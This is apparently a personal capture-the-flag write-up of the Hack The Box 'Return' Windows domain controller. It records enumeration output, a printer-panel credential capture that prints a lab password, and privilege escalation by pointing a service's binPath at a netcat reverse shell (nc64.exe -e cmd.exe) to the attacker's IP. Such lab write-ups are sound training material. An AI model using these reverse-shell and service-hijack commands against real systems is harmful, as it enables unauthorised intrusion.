# HTB Return

Basic nmap scan:
```
Nmap scan report for 10.10.11.108
Host is up (0.15s latency).
Not shown: 65387 closed tcp ports (reset), 128 filtered tcp ports (no-response)
PORT      STATE SERVICE
88/tcp    open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49679/tcp open  unknown
49682/tcp open  unknown
49694/tcp open  unknown
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 382.09 seconds
          Raw packets sent: 66449 (2.924MB) | Rcvd: 66820 (2.682MB)
```

Aggressive nmap scan:
```
Nmap scan report for 10.10.11.108
Host is up (0.17s latency).
Not shown: 991 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
53/tcp  open  domain?
88/tcp  open  kerberos-sec?
135/tcp open  msrpc?
139/tcp open  netbios-ssn?
389/tcp open  ldap?
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Device type: firewall
Running (JUST GUESSING): Fortinet embedded (87%)
OS CPE: cpe:/h:fortinet:fortigate_100d
Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 12 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 18m33s
| smb2-security-mode: 
|  311: 
|_    Message signing enabled and required
| smb2-time: 
|  date: 2023-03-28T23:33:28
|_  start_date: N/A
TRACEROUTE (using port 199/tcp)
HOP RTT        ADDRESS
1  103.38 ms  10.10.16.1
2  1857.03 ms 10.10.16.1
3  ... 11
12  123.66 ms  10.10.11.108
NSE: Script Post-scanning.
Initiating NSE at 17:15
Completed NSE at 17:15, 0.00s elapsed
Initiating NSE at 17:15
Completed NSE at 17:15, 0.00s elapsed
Initiating NSE at 17:15
Completed NSE at 17:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.92 seconds
          Raw packets sent: 1204 (58.968KB) | Rcvd: 1216 (49.012KB)
```

CME enumeration:
```
└─$ crackmapexec smb 10.10.11.108 
SMB        10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)

┌──(cl3al㉿CybSec-White-Hat-21)-[~]
└─$ crackmapexec smb 10.10.11.108 --users
SMB        10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB        10.10.11.108    445    PRINTER          [-] Error enumerating domain users using dc ip 10.10.11.108: NTLM needs domain\username and a password
SMB        10.10.11.108    445    PRINTER          [*] Trying with SAMRPC protocol
```

smbclient SMB share enumeration.:

It appears no shares are accessible to me but anonymous login is permitted. I will doublecheck to see if this is just an error that I may need to resolve.
```
└─$ smbclient -L \\\\10.10.11.108 
Password for [WORKGROUP\cl3al]:
Anonymous login successful
Sharename      Type      Comment
---------      ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Nmap SMB CVE Enumeration (No vulns found).:
```
└─$ sudo nmap -PN --script smb-vuln* -p139,445 10.10.11.108
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 17:20 MDT
Nmap scan report for 10.10.11.108
Host is up (0.061s latency).
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
```

LDAP enumeration with nmap:
```
└─$ sudo nmap -n -sV --script "ldap* and not brute" -p 389 10.10.11.108
[sudo] password for cl3al: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 17:26 MDT
Nmap scan report for 10.10.11.108
Host is up (0.056s latency).
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|  <ROOT>
|      domainFunctionality: 7
|      forestFunctionality: 7
|      domainControllerFunctionality: 7
|      rootDomainNamingContext: DC=return,DC=local
|      ldapServiceName: return.local:printer$@RETURN.LOCAL
|      isGlobalCatalogReady: TRUE
|      supportedSASLMechanisms: GSSAPI
|      supportedSASLMechanisms: GSS-SPNEGO
|      supportedSASLMechanisms: EXTERNAL
|      supportedSASLMechanisms: DIGEST-MD5
|      supportedLDAPVersion: 3
|      supportedLDAPVersion: 2
|      supportedLDAPPolicies: MaxPoolThreads
|      supportedLDAPPolicies: MaxPercentDirSyncRequests
|      supportedLDAPPolicies: MaxDatagramRecv
|      supportedLDAPPolicies: MaxReceiveBuffer
|      supportedLDAPPolicies: InitRecvTimeout
|      supportedLDAPPolicies: MaxConnections
|      supportedLDAPPolicies: MaxConnIdleTime
|      supportedLDAPPolicies: MaxPageSize
|      supportedLDAPPolicies: MaxBatchReturnMessages
|      supportedLDAPPolicies: MaxQueryDuration
|      supportedLDAPPolicies: MaxDirSyncDuration
|      supportedLDAPPolicies: MaxTempTableSize
|      supportedLDAPPolicies: MaxResultSetSize
|      supportedLDAPPolicies: MinResultSets
|      supportedLDAPPolicies: MaxResultSetsPerConn
|      supportedLDAPPolicies: MaxNotificationPerConn
|      supportedLDAPPolicies: MaxValRange
|      supportedLDAPPolicies: MaxValRangeTransitive
|      supportedLDAPPolicies: ThreadMemoryLimit
|      supportedLDAPPolicies: SystemMemoryLimitPercent
|      supportedControl: 1.2.840.113556.1.4.319
|      supportedControl: 1.2.840.113556.1.4.801
|      supportedControl: 1.2.840.113556.1.4.473
|      supportedControl: 1.2.840.113556.1.4.528
|      supportedControl: 1.2.840.113556.1.4.417
|      supportedControl: 1.2.840.113556.1.4.619
|      supportedControl: 1.2.840.113556.1.4.841
|      supportedControl: 1.2.840.113556.1.4.529
|      supportedControl: 1.2.840.113556.1.4.805
|      supportedControl: 1.2.840.113556.1.4.521
|      supportedControl: 1.2.840.113556.1.4.970
|      supportedControl: 1.2.840.113556.1.4.1338
|      supportedControl: 1.2.840.113556.1.4.474
|      supportedControl: 1.2.840.113556.1.4.1339
|      supportedControl: 1.2.840.113556.1.4.1340
|      supportedControl: 1.2.840.113556.1.4.1413
|      supportedControl: 2.16.840.1.113730.3.4.9
|      supportedControl: 2.16.840.1.113730.3.4.10
|      supportedControl: 1.2.840.113556.1.4.1504
|      supportedControl: 1.2.840.113556.1.4.1852
|      supportedControl: 1.2.840.113556.1.4.802
|      supportedControl: 1.2.840.113556.1.4.1907
|      supportedControl: 1.2.840.113556.1.4.1948
|      supportedControl: 1.2.840.113556.1.4.1974
|      supportedControl: 1.2.840.113556.1.4.1341
|      supportedControl: 1.2.840.113556.1.4.2026
|      supportedControl: 1.2.840.113556.1.4.2064
|      supportedControl: 1.2.840.113556.1.4.2065
|      supportedControl: 1.2.840.113556.1.4.2066
|      supportedControl: 1.2.840.113556.1.4.2090
|      supportedControl: 1.2.840.113556.1.4.2205
|      supportedControl: 1.2.840.113556.1.4.2204
|      supportedControl: 1.2.840.113556.1.4.2206
|      supportedControl: 1.2.840.113556.1.4.2211
|      supportedControl: 1.2.840.113556.1.4.2239
|      supportedControl: 1.2.840.113556.1.4.2255
|      supportedControl: 1.2.840.113556.1.4.2256
|      supportedControl: 1.2.840.113556.1.4.2309
|      supportedControl: 1.2.840.113556.1.4.2330
|      supportedControl: 1.2.840.113556.1.4.2354
|      supportedCapabilities: 1.2.840.113556.1.4.800
|      supportedCapabilities: 1.2.840.113556.1.4.1670
|      supportedCapabilities: 1.2.840.113556.1.4.1791
|      supportedCapabilities: 1.2.840.113556.1.4.1935
|      supportedCapabilities: 1.2.840.113556.1.4.2080
|      supportedCapabilities: 1.2.840.113556.1.4.2237
|      subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=return,DC=local
|      serverName: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=return,DC=local
|      schemaNamingContext: CN=Schema,CN=Configuration,DC=return,DC=local
|      namingContexts: DC=return,DC=local
|      namingContexts: CN=Configuration,DC=return,DC=local
|      namingContexts: CN=Schema,CN=Configuration,DC=return,DC=local
|      namingContexts: DC=DomainDnsZones,DC=return,DC=local
|      namingContexts: DC=ForestDnsZones,DC=return,DC=local
|      isSynchronized: TRUE
|      highestCommittedUSN: 102480
|      dsServiceName: CN=NTDS Settings,CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=return,DC=local
|      dnsHostName: printer.return.local
|      defaultNamingContext: DC=return,DC=local
|      currentTime: 20230328234505.0Z
|_      configurationNamingContext: CN=Configuration,DC=return,DC=local
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
```

Kerberos user enumeration with nmap.:
```
└─$ sudo nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='return.local', userdb=/usr/share/wordlists/dirb/common.txt" 10.10.11.108
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 17:51 MDT
Nmap scan report for 10.10.11.108
Host is up (0.068s latency).
PORT  STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|    printer@return.local
|_    administrator@return.local
Nmap done: 1 IP address (1 host up) scanned in 61.44 seconds
```

After finding the user printer@return.local, I tried to grab the TGT. However, while I did not get this here in the next output, I did get confirmation that there is no PRE\_AUTH set for this user. This means I should be able to grab the hash.:
```
─$ impacket-GetNPUsers return.local/printer -dc-ip 10.10.11.108
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password:
[*] Cannot authenticate printer, getting its TGT
[-] User printer doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**_For some reason, I realized after looking up this box, that there is a website on port 80 for a printer admin panel. For some reason, port 80 did not show in any of the enumeration scans even when specifying all ports. REMEMBER TO TRY A BASIC NMAP SCAN WITH NO PARAMETERS OTHER THAN THE TARGET._**

In this case, I was able to establish a reverse shell by abusing the printer's admin panel. by using my Tun0 IP address and then setting up a netcat listener on port 389.:
![[./_resources/HTB_Return.resources/image.png]]![[./_resources/HTB_Return.resources/image.1.png]]
This revealed the password for the printer:

```
Uname: svc-printer
Passwd: 1edFg43012!!
```

This allowed me to then get a winrm session with evil-winrm.:
![[./_resources/HTB_Return.resources/image.2.png]]

User.txt hash:
![[./_resources/HTB_Return.resources/image.3.png]]
Next, I went up to the root directory and created a tmp folder. Then I uploaded Winpeasx64 to it. I was not able to execute it with powershell for some reason so I used the following command:
```
cmd.exe /c 'winPEASx64.exe'
```

I did not find anything out of the ordinary except for the fact that there are multiple groups this current user (svc-printer) is a part of.:
![[./_resources/HTB_Return.resources/image.4.png]]
in particular, the **Server Operators** group. When researching this, there is a clear path to escalate privileges. In particular, the article linked here that I found.:

**Server Operators group information:**
The Server Operator group is a special user group that often has access to powerful commands and settings on a computer system. This group is typically used for managing a server or for troubleshooting system problems. Server Operators are usually responsible for monitoring the server’s performance, managing system security, and providing technical support to users. They may also oversee installing software updates, creating and maintaining user accounts, and performing routine maintenance tasks.

Next, I used the services command to ernumerate the services running.:
![[./_resources/HTB_Return.resources/image.5.png]]
From there, I would transfer the nc64.exe binary to the tmp folder and change the binary path of the service. The reason we are changing the binary path is to receive a reverse connection as system user from the compromised hosts. I used the following command to change the path of the binary.:
```
sc.exe config VMTools binPath="C:\tmp\nc64.exe -e cmd.exe 10.10.16.4 4444"
```

Then, I setup a netcat listener on my attacking machine and stopped and started the VMTools service like so.:
```
*Evil-WinRM* PS C:\tmp> sc.exe stop VMTools
```
finally:
```
*Evil-WinRM* PS C:\tmp> sc.exe start VMTools
```

![[./_resources/HTB_Return.resources/image.6.png]]

root.txt:
![[./_resources/HTB_Return.resources/image.7.png]]

**###ROOTED!!!###**
